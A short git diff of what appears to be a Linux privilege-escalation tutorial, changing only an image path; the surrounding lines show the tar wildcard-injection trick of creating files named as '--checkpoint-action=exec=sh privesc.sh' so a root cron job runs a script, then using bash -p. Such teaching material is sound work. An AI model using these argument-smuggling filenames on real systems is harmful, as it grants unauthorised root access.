@@ -149,7 +149,7 @@ Next we create the following two files which will server as our arguments when t
 touch /home/user3/Documents/--checkpoint=1
 touch '/home/user3/Documents/--checkpoint-action=exec=sh privesc.sh'
 ```
-![Wildcard Files](./assets/images/crontab/15%20-%20wild_files.png)
+![Wildcard Files](../../assets/images/crontab/15%20-%20wild_files.png)
 
 All we need to do now is to wait for Cron to run the job and execute the `/bin/bash` binary with the `-p` flag to get privilege escalation.
 
